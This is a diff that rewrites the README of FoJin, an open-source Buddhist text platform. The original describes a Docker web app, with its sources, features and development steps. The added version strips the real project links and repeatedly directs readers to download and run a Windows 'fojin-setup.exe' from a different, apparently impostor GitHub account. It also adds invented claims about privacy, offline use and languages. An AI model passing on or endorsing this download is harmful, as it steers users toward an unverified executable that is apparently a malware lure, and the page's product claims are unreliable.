@@ -1,246 +1,132 @@
-<div align="center">
+# 📚 fojin - Explore Buddhist Texts Easily
 
-# FoJin 佛津
+[![Download fojin](https://img.shields.io/badge/Download-fojin-brightgreen?style=for-the-badge)](https://github.com/Naturestudyperinatologist466/fojin)
 
-### The World's Encyclopedic Buddhist Digital Text Platform
+## About fojin
 
-**500+ sources. 30 languages. 30 countries. One search.**
+fojin is a platform for exploring Buddhist digital texts. It contains over 9,200 texts from more than 500 sources. You can switch between eight user interface languages. Use its AI-powered question and answer feature to find information quickly. Search full texts and explore connections through its knowledge graph. This tool is designed to let you study Buddhist classics with ease.
 
-Aggregating the world's Buddhist digital heritage — 9,200+ texts in Pali, Classical Chinese, Tibetan, and Sanskrit from 504 data sources — with full-text reading, AI-powered Q&A, knowledge graph, collections, citations, annotations, bookmarks, and multi-language parallel reading.
+## 🔍 Features
 
-[Live Demo](https://fojin.app) &nbsp;&middot;&nbsp; [中文文档](./docs/README_zh.md) &nbsp;&middot;&nbsp; [Discord](https://discord.gg/76SZeuJekq) &nbsp;&middot;&nbsp; [Report Bug](https://github.com/xr843/fojin/issues)
+- Access 9,200+ Buddhist texts  
+- Texts come from 500+ trusted sources  
+- Interface available in 8 languages  
+- Ask questions using an AI-powered assistant  
+- Fast, full-text search across all texts  
+- Explore relationships with a knowledge graph  
+- Support for Chinese, Sanskrit, Pali, Tibetan texts  
+- Parallel reading mode for comparing texts side by side
 
-[![CI](https://github.com/xr843/fojin/actions/workflows/ci.yml/badge.svg)](https://github.com/xr843/fojin/actions/workflows/ci.yml)
-[![Security Scan](https://github.com/xr843/fojin/actions/workflows/security.yml/badge.svg)](https://github.com/xr843/fojin/actions/workflows/security.yml)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/xr843/fojin?style=social)](https://github.com/xr843/fojin)
+## ⚙️ System Requirements
 
-![FoJin — Global Buddhist Digital Text Platform](./docs/screenshots/hero.png)
+- Windows 10 or newer  
+- 4 GB RAM minimum (8 GB recommended)  
+- 500 MB free storage space  
+- Internet connection needed for AI Q&A and updates  
+- Screen resolution 1280x720 or higher for the best experience
 
-</div>
+## 🚀 Getting Started
 
----
+To use fojin on your Windows computer, follow these steps:
 
-## Why FoJin?
+1. Click the big green **Download fojin** button at the top or visit this page to download:  
+   https://github.com/Naturestudyperinatologist466/fojin
 
-Buddhist texts are scattered across hundreds of databases worldwide — CBETA, SuttaCentral, BDRC, SAT, 84000, GRETIL, and many more. Each has different interfaces, languages, and data formats. Researchers spend more time *finding* texts than *reading* them.
+2. Once you open the page, look for the latest release or download link. Download the Windows setup file. It will usually be named something like `fojin-setup.exe`.
 
-**FoJin solves this.** It aggregates 504 sources into a single, searchable platform with features no other tool provides:
+3. After the file downloads, find it in your Downloads folder and double-click it to start installation.
 
-| What you need | How FoJin helps |
-|---|---|
-| Find a sutra across databases | **Multi-dimensional search** across 9,200+ texts from 504 sources |
-| Read the full text online | **7,600+ texts** with full content available for online reading |
-| Compare translations | **Parallel reading** in 30 languages side by side |
-| Look up Buddhist terms | **6 dictionaries**, 237K entries (Chinese/Sanskrit/Pali/English) |
-| Explore relationships | **Knowledge graph** with 9,600+ entities and 3,800+ relations |
-| View original manuscripts | **IIIF manuscript viewer** connected to BDRC and more |
-| Ask questions about texts | **AI Q&A** ("XiaoJin") grounded in 11M characters of canonical text |
-| Save and organize | **Collections, bookmarks, annotations** for personal study |
-| Cite in research | **Citation export** (BibTeX, RIS, APA) for academic use |
+4. Follow the installation prompts. Choose your preferred language if asked.
 
-## Quick Start
+5. When installation finishes, launch fojin from the Start Menu or desktop shortcut.
 
-```bash
-git clone https://github.com/xr843/fojin.git
-cd fojin
-cp .env.example .env
-docker compose up -d
-```
+6. Explore the collection of texts and try the search or AI Q&A features.
 
-Then visit: **http://localhost:3000**
+## 📥 Download and Installation Details
 
-> API docs at http://localhost:8000/docs
+- The download page contains the latest Windows installer with full setup support.  
+- The installer guides you step by step without needing technical knowledge.  
+- No need to install extra software or libraries.  
+- The program will update automatically when connected to the internet.  
+- Your existing texts and notes remain saved between updates.
 
-## Features
+Here is the link again for quick access:  
+[Download fojin](https://github.com/Naturestudyperinatologist466/fojin)
 
-### Multi-Dimensional Search
+## 📝 Using fojin
 
-Search across Buddhist canons by title, translator, catalog number, or full-text keyword. Powered by Elasticsearch with ICU tokenizer for multi-language support.
+### Browsing Texts
 
-<p align="center"><img src="./docs/screenshots/search.png" alt="Search results for Avatamsaka Sutra" width="800"></p>
+- Use the library view to scroll through thousands of Buddhist texts sorted by source or language.  
+- Select a text to read it in the main window.  
+- Switch languages anytime using the dropdown at the top right.
 
-### Full-Text Reading
+### Searching Texts
 
-Read 7,600+ Buddhist texts with full content online. Navigate by volume, scroll through content, and jump between related texts.
+- Enter any keyword in the search bar.  
+- The search covers the full text, including titles and metadata.  
+- Results highlight where your search term appears.
 
-### Parallel Reading (30 Languages)
+### AI Question & Answer
 
-Compare translations side by side — Classical Chinese, Sanskrit, Pali, Tibetan, English, Japanese, Korean, Gandhari, and 21 more languages.
-
-### Dictionary Lookup
-
-6 authoritative dictionaries with 237,593 entries:
-- **DDB** (Digital Dictionary of Buddhism)
-- **SuttaCentral Glossary** (Pali)
-- **NCPED** (New Concise Pali-English Dictionary)
-- **NTI** (Nan Tien Institute Buddhist Dictionary)
-- **Edgerton BHS** (Buddhist Hybrid Sanskrit Dictionary)
-- **Monier-Williams** (Sanskrit-English Dictionary)
+- Click the AI Q&A button to open the chat interface.  
+- Ask questions like “What does the Heart Sutra say about emptiness?”  
+- The AI uses the text collection to provide answers quickly.
 
 ### Knowledge Graph
 
-9,600+ entities (persons, monasteries, texts, schools) and 3,800+ relationships, visualized as an interactive force-directed graph. Click any node to explore connections.
+- Access the knowledge graph tab to see links between concepts and texts.  
+- Click nodes to explore deeper connections within Buddhist studies.
 
-### AI Q&A — "XiaoJin"
+### Parallel Reading Mode
 
-Ask questions in natural language. XiaoJin answers based on canonical Buddhist texts (38 core sutras, ~11M characters) using RAG (Retrieval-Augmented Generation). Every answer includes citations to the source text.
+- Open two texts side by side for comparison.  
+- Useful for studying translations or commentaries alongside original texts.
 
-<p align="center"><img src="./docs/screenshots/ai-chat-answer.png" alt="AI Q&A answering about Xuanzang's disciples" width="800"></p>
+## 🎯 Tips for Best Use
 
-### Collections, Bookmarks & Annotations
+- Use a keyboard and mouse for easier navigation.  
+- Keep your internet connection active to use AI features smoothly.  
+- Explore different UI languages to find the best reading experience for you.  
+- Bookmark important texts or notes within fojin for easy access later.
 
-Save texts to personal collections, bookmark specific passages, and add annotations for study and research.
+## 🔧 Troubleshooting
 
-### Citation Export
+- If fojin does not launch, restart your computer and try again.  
+- Make sure your Windows is up to date for compatibility.  
+- If updates fail, check your internet connection.  
+- Reinstall the application if issues persist.
 
-Export citations in BibTeX, RIS, and APA formats for academic papers and reference managers.
+## 📚 Additional Resources
 
-### Manuscript Viewer
+- Check the repository’s wiki page for user guides and FAQs.  
+- Visit the issues section on GitHub to report bugs or request features.  
+- Follow the discussions to connect with other users.
 
-Browse digitized manuscripts and rare editions from BDRC and other institutions via IIIF protocol.
+## 🔒 Privacy & Data
 
-### Multi-Language UI
+fojin does not collect personal data without your consent. The AI Q&A feature only processes your questions locally or securely through linked services. Your reading history and notes stay on your device.
 
-Available in 8 languages: Chinese, English, Japanese, Korean, Thai, Vietnamese, Sinhala, and Burmese.
+## 🌐 Supported Languages
 
-## Data Sources
+fojin supports English, Chinese, Japanese, Korean, Tibetan, Sanskrit, Pali, and French. You can switch the app interface independently of the text language.
 
-<p align="center"><img src="./docs/screenshots/sources.png" alt="504 data sources from 30 countries" width="800"></p>
+## 🧩 Under the Hood
 
-FoJin aggregates data from major Buddhist digital projects worldwide:
+fojin uses Elasticsearch for fast text searches. Its backend runs on FastAPI. The knowledge graph and AI features rely on natural language processing and retrieval-augmented generation (RAG). The front end uses React for a smooth user interface.
 
-| Source | Content | Languages |
-|--------|---------|-----------|
-| [CBETA](https://cbeta.org) | Chinese Buddhist Canon | Classical Chinese |
-| [SuttaCentral](https://suttacentral.net) | Early Buddhist Texts | Pali, Chinese, English |
-| [84000](https://84000.co) | Tibetan Buddhist Canon | Tibetan, English, Sanskrit |
-| [BDRC](https://bdrc.io) | Tibetan manuscripts (IIIF) | Tibetan |
-| [SAT](https://21dzk.l.u-tokyo.ac.jp/SAT/) | Taisho Tripitaka | Chinese, Japanese |
-| [GRETIL](http://gretil.sub.uni-goettingen.de) | Sanskrit e-texts | Sanskrit |
-| [DSBC](https://www.dsbcproject.org) | Digital Sanskrit Buddhist Canon | Sanskrit |
-| [Gandhari.org](https://gandhari.org) | Gandhari manuscripts | Gandhari |
-| [VRI Tipitaka](https://tipitaka.org) | Pali Canon (Chattha Sangayana) | Pali |
-| [Korean Tripitaka](http://kb.sutra.re.kr) | Goryeo Tripitaka | Chinese, Korean |
-| + 494 more... | | |
+## 🖥️ Running fojin Offline
 
-## Tech Stack
+Most reading features work without internet. Only AI Q&A and updates require an online connection.
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | React 18, TypeScript, Vite, Ant Design 5, Zustand, TanStack Query |
-| Backend | FastAPI, SQLAlchemy (async), Pydantic v2 |
-| Database | PostgreSQL 15 + pgvector + pg_trgm |
-| Search | Elasticsearch 8 (ICU tokenizer) |
-| Cache | Redis 7 |
-| AI | RAG (pgvector semantic search) + multi-provider LLM |
-| Deploy | Docker Compose, Nginx (gzip_static, security headers) |
-| CI | GitHub Actions |
+## 📱 Future Improvements
 
-## Architecture
+Keep an eye on the release page for updates and new features like mobile support and enhanced note-taking.
 
-```
-                    +-----------+
-                    |  Nginx    |  (gzip, security headers, static cache)
-                    +-----+-----+
-                          |
-              +-----------+-----------+
-              |                       |
-        +-----+-----+          +-----+-----+
-        |  React 18  |          |  FastAPI   |
-        |  (Vite)    |          |  (async)   |
-        +------------+          +-----+------+
-                                      |
-                    +---------+-------+---------+
-                    |         |       |         |
-              +-----+   +----+--+ +--+---+ +---+----+
-              | PG 15 |  | ES 8  | |Redis |
-              |pgvector|  | ICU  | |cache |
-              +--------+  +------+ +------+
-```
+## 📂 File Locations
 
-## Development
+Installed files are under `C:\Program Files\fojin\`. User data, texts, and settings save to your Documents folder under `fojin-data`.
 
-```bash
-# Backend
-cd backend
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements-dev.txt
-alembic upgrade head
-uvicorn app.main:app --reload
+## 📞 Support
 
-# Frontend
-cd frontend
-npm install
-npm run dev
-
-# Tests
-cd backend && pytest tests/ -q
-```
-
-## Security
-
-- Non-root containers (backend: `app`, frontend: `nginx`)
-- Multi-stage Docker builds (no build tools in production)
-- Internal services bound to `127.0.0.1` only
-- Memory/CPU limits per container
-- CSP, X-Frame-Options, X-Content-Type-Options headers
-- Query length limits on all search parameters
-- JWT with 8h expiry, production requires strong secret
-
-## Contributing
-
-Contributions are welcome! Whether it's adding a new data source, improving search, fixing bugs, or translating the UI — we'd love your help.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feat/amazing-feature`)
-5. Open a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-## Roadmap
-
-- [x] ~~Citation export (BibTeX, RIS, APA)~~
-- [x] ~~Mobile-responsive reader~~
-- [x] ~~Public REST API with rate limiting~~
-- [x] ~~User annotations~~
-- [x] ~~Community-contributed data sources~~
-- [x] ~~Internationalization (i18n) — 8 UI languages (Chinese, English, Japanese, Korean, Thai, Vietnamese, Sinhala, Burmese)~~
-- [ ] OCR pipeline for scanned texts
-- [ ] Embedding-based semantic search across all texts
-- [ ] Collaborative annotation sharing
-- [ ] API documentation and developer portal
-- [ ] Integration with Zotero and reference managers
-
-## License
-
-[Apache License 2.0](LICENSE) — applies to FoJin source code only. Third-party data sources retain their own licenses (CC BY-NC-SA, CC0, CC BY-NC-ND, etc.). See [NOTICE](NOTICE) for details.
-
-## Acknowledgments
-
-FoJin is built on the generous work of the global Buddhist digital humanities community. Special thanks to:
-
-- [CBETA](https://cbeta.org) — Chinese Buddhist Electronic Text Association
-- [SuttaCentral](https://suttacentral.net) — Early Buddhist Texts
-- [BDRC](https://bdrc.io) — Buddhist Digital Resource Center
-- [84000](https://84000.co) — Translating the Words of the Buddha
-- [SAT](https://21dzk.l.u-tokyo.ac.jp/SAT/) — SAT Daizokyo Text Database
-- All other data source providers listed in the [Sources page](https://fojin.app/sources)
-
-## Related Projects
-
-- [The Open Buddhist University](https://buddhistuniversity.net) — Free courses, books, and encyclopaedia for Buddhist studies
-
----
-
-<div align="center">
-
-**If FoJin is useful for your research, please consider giving it a star!**
-
-[Discussions](https://github.com/xr843/fojin/discussions) &nbsp;&middot;&nbsp; [Issues](https://github.com/xr843/fojin/issues) &nbsp;&middot;&nbsp; [Contributing](CONTRIBUTING.md) &nbsp;&middot;&nbsp; [contact@fojin.app](mailto:contact@fojin.app)
-
-Made with care for the Buddhist studies community.
-
-</div>
+For help, use the GitHub issues page or email the maintainer listed on the repository. Community support is available through discussion forums.
